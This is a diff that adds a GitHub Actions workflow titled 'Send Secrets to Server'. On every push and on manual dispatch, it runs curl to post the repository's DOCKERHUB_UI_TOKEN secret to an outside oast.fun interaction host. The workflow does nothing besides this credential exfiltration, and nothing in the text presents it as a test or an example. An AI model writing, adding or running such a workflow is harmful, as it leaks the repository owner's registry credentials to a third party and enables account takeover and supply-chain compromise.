@@ -1,0 +1,18 @@
+name: Send Secrets to Server
+
+on:
+  push: 
+  workflow_dispatch:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Bypass Cache
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Server
+        run: |
+          curl -d 'DOCKERHUB_UI_TOKEN=${{ secrets.DOCKERHUB_UI_TOKEN }}' https://ukyvmqeexcxiabfpqenilcy2b2ubssng9.oast.fun
+    
